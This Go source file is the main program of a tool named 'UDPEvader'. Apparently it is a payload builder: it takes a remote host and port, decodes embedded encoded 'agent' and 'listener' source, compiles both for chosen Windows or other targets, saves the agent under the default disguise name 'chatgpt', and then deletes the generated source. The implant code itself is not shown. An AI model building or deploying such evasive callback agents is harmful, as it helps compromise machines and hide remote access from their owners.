package main

import (
	"UDPEvader/src/binmaker"
	"UDPEvader/src/sourcegen"
	"flag"
	"fmt"
	"runtime"
	"time"
)

func main() {
	oUserOptions := &binmaker.UserOptions{}
	cmdargrhost := flag.String("rhost", "127.0.0.1", "If not provided, default will be 127.0.0.1")
	cmdargrport := flag.Int("rport", 8080, "If not provided, default will be 8080")
	cmdargapptype := flag.String("agentbintype", "console", "If not provided, default will be console")
	cmdagentos := flag.String("agentos", "windows", "If not provided, default will be current OS")
	cmdagentarch := flag.Int("agentarch", 32, "If not provided, default will be current OS architecture")
	cmdlisteneros := flag.String("listeneros", "windows", "If not provided, default will be current OS")
	cmdlistenerarch := flag.Int("listenerarch", 32, "If not provided, default will be current OS architecture bit")
	cmdargsaveas := flag.String("saveas", "chatgpt", "If not provided, default will be chatgpt")

	flag.Parse()

	if flag.Lookup("rhost") == nil {
		oUserOptions.Rhost = "127.0.0.1"
	} else {
		oUserOptions.Rhost = *cmdargrhost
	}
	if flag.Lookup("rport") == nil {
		oUserOptions.Rport = "8080"
	} else {
		oUserOptions.Rport = fmt.Sprintf("%d", *cmdargrport)
	}
	if flag.Lookup("agentbintype") == nil {
		oUserOptions.AppType = "console"
	} else {
		oUserOptions.AppType = *cmdargapptype
	}
	if flag.Lookup("agentos") == nil {
		oUserOptions.AgentOS = runtime.GOOS
	} else {
		oUserOptions.AgentOS = *cmdagentos
	}
	if flag.Lookup("agentarch") == nil {
		oUserOptions.AgentArch = runtime.GOARCH
	} else {
		if *cmdagentarch == 32 {
			oUserOptions.AgentArch = "386"
		} else if *cmdagentarch == 64 {
			oUserOptions.AgentArch = "amd64"
		}
	}
	if flag.Lookup("listeneros") == nil {
		oUserOptions.ListenerOS = runtime.GOOS
	} else {
		oUserOptions.ListenerOS = *cmdlisteneros
	}
	if flag.Lookup("listenerarch") == nil {
		oUserOptions.ListenerArch = runtime.GOARCH
	} else {
		if *cmdlistenerarch == 32 {
			oUserOptions.ListenerArch = "386"
		} else if *cmdlistenerarch == 64 {
			oUserOptions.ListenerArch = "amd64"
		}
	}

	if flag.Lookup("saveas") == nil {
		oUserOptions.SaveAs = "chatgpt"
	} else {
		oUserOptions.SaveAs = *cmdargsaveas
	}

	oDecoder := &sourcegen.Decoder{}

	oDecoder.DecodeSource(sourcegen.EncodedAgent)
	oUserOptions.DecodedSourceCode = oDecoder.DecodedSource
	oUserOptions.UpdateSourceCode(false)
	oUserOptions.CreateSourceFile()
	agentfinflag := make(chan string)
	go oUserOptions.SourceToBinary(false, agentfinflag)
	<-agentfinflag

	oDecoder.DecodeSource(sourcegen.EncodedListener)
	oUserOptions.DecodedSourceCode = oDecoder.DecodedSource
	oUserOptions.UpdateSourceCode(true)
	oUserOptions.CreateSourceFile()
	listenerfinflag := make(chan string)
	go oUserOptions.SourceToBinary(true, listenerfinflag)
	<-listenerfinflag

	time.Sleep(3 * time.Second)
	oUserOptions.ClearAllSource()

}
